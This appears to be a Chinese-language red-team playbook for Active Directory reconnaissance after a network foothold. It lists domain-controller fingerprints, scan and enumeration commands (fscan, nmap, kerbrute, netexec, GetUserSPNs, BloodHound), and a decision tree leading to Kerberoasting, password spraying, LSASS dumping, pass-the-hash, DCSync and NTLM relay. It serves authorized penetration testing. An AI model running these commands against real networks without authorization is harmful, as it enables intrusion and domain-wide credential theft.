# 内网域侦察与攻击决策树

> 适用：已取得边界立足点，需要判定当前网段是否域环境、定位域控，并把攻击面收敛成一条可执行路径的授权评估。

## 认什么

| 信号 | 判据 | 含义 |
|---|---|---|
| `systeminfo` / `ipconfig /all` | Domain ≠ WORKGROUP；DNS Server 指向内网 IP | 域环境，DNS 通常就是 DC |
| 端口组合 | 88+389+445 同时开 | 大概率域控，需 SRV 复核 |
| 3268/3269 | Global Catalog | 跨域/森林查询 |
| 53 / 464 / 5985 | DNS / kpasswd / WinRM | 配置与横向前置 |
| `netexec smb` | `signing:True` | 多为 DC；`signing:False` 记为 NTLM 中继目标 |
| `netexec smb` | `domain:xxx.local` 出现多个 | 多域/父子域，先分清再选面 |
| 网卡与路由 | 多网卡、非默认网关 | 天然跳板，可进下一网段 |
| 匿名面 | `-u '' -p '' --shares --users` 有回显 | 无凭据可枚举 |
| 域内身份 | `whoami /all`、`net user /domain` | 有域用户即进深度枚举 |
| 密码策略 | `net accounts /domain` / `--pass-pol` | 喷洒前置：锁定阈值、观察窗口 |
| 计算机账户 | UAC=4128 且 `logonCount=0` | 可能仍是 Pre-Windows 2000 默认密码 |

## 打哪（命令）

**当前位置与网段**

```bash
ip addr && ip route && cat /etc/resolv.conf && arp -a
ipconfig /all && route print && arp -a && net view /domain
```

**存活与端口（fscan 优先，nmap 降级）**

```bash
fscan -h 10.0.0.0/24 -nopoc        # 存活+端口
fscan -h 10.0.0.0/24 -np -nopoc    # ICMP 被禁时不 ping 直接扫
fscan -h 10.0.0.0/24 -p 22,80,135,139,443,445,1433,3306,3389,5432,5985,6379,8080,9200
nmap -sn 10.0.0.0/24 ; nmap -PR -sn 10.0.0.0/24        # ARP 扫描仅同网段
nmap -Pn -p 53,88,135,139,389,445,464,636,3268,3269,5985,5986 -sC -sV DC_IP
```

**域控定位**

```bash
nltest /dclist:DOMAIN
nslookup -type=srv _ldap._tcp.dc._msdcs.DOMAIN DC_IP
nslookup -type=srv _kerberos._tcp.DOMAIN DC_IP
nslookup -type=srv _gc._tcp.FOREST_ROOT DC_IP
```

**无凭据枚举 / 有域用户后的深度枚举**

```bash
netexec smb CIDR
netexec smb DC_IP -u '' -p '' --users --shares --pass-pol
enum4linux-ng -A DC_IP
kerbrute userenum -d DOMAIN --dc DC_IP userlist.txt
netexec ldap DC_IP -u USER -p PASS --users
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP
bloodhound-python -d DOMAIN -u USER -p PASS -dc DC_IP -c all
ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP all   # 或 delegations/spns/asreproast/trusts
```

**环境配置（不做后续 Kerberos 全挂）**

```bash
netexec smb DC_IP --generate-krb5-file /tmp/krb5.conf
netexec smb CIDR --generate-hosts-file /tmp/hostsfile
sudo ntpdate DC_IP        # 时间差 > 5 分钟 → KRB_AP_ERR_SKEW
```

**跨网段/代理后**

```bash
proxychains4 -q netexec smb 10.10.10.0/24
proxychains4 -q nmap -sT -Pn -p 445,389,88,135 10.10.10.0/24   # 代理下只能 -sT
```

### 决策树：手里有什么，就决定了下一枪打哪

```text
手里有什么？
├─ 无凭据 → 匿名 SMB/LDAP 枚举、kerbrute 用户名 → AS-REP Roasting（internal-02）
├─ 任意域用户 → Kerberoasting / 密码喷洒（先查锁定策略）/ BloodHound 找路径（internal-02、internal-03）
├─ 本地管理员 → SAM/LSASS 提凭据 → PTH 横向、凭据复用（internal-04、internal-05）
├─ 域管权限 → DCSync 取全域 hash（internal-02）
├─ 发现委派 / ACL / ADCS 边 → 委派、ACL、证书利用（internal-03）
└─ 只到边界同广播域 → 投毒 + 中继（internal-04），再回到本树的上一层
```

## 什么算成

- SRV 记录确认 DC 的 FQDN，且同一主机在 `netexec smb` 里是 `signing:True` + 目标域名
- kerbrute 从用户字典筛出有效用户名；`--pass-pol` 拿到锁定阈值（决定能否喷洒）
- 域用户凭据在 LDAP/SMB 认证成功，BloodHound 采到图并能出最短路径
- 产出三类清单：DC、`signing:False` 的中继目标、高价值服务（1433/3306/5432/6379/9200/5985）
- 发现双网卡跳板，且从该机可路由到新网段

## 假点

- 88/389 开放 ≠ 域控：第三方 Kerberos/LDAP 也开这些端口；`signing:True` 只是"通常是 DC"，必须用 DNS SRV 复核
- SRV 查不到 ≠ 没有域：DNS 配置错误或没把 DC 当 DNS，改用 `nslookup ... DC_IP` 重试
- 匿名 `--users` 空 ≠ 无枚举面：null session 被禁时换已认证枚举或走 kerbrute/RPC
- 扫出端口 ≠ 有攻击面：打印/备份/中间件端口未必有可复用凭据；同网段 ARP 发现不到跨网段主机
- BloodHound 有图 ≠ 有路径：LDAP 查询被裁时图不完整；图里无 edge 就换 ACL/ADCS/中继面，不要报"无攻击路径"
- `net view /domain` 失败不能当"没有域"：受 Browser/网络位置影响，换 SRV 与 SMB 字段判断

## 与其他包联动

- 有域用户后先开 `internal-02`（SPN/AS-REP），BloodHound 的委派/ACL 边与 ADCS 进 `internal-03`
- `signing:False` 清单直接喂 `internal-04`（中继/投毒）；凭据落地横向走 `internal-05`；隧道见 `internal-06`
- 初始凭据来自 `web-auth-access`；云主机/元数据拿到的凭据接 `cloud-infra`；首枪表见 `ck-router` 的 `../../ck-router/knowledge/战法索引-08-内网与域.md`
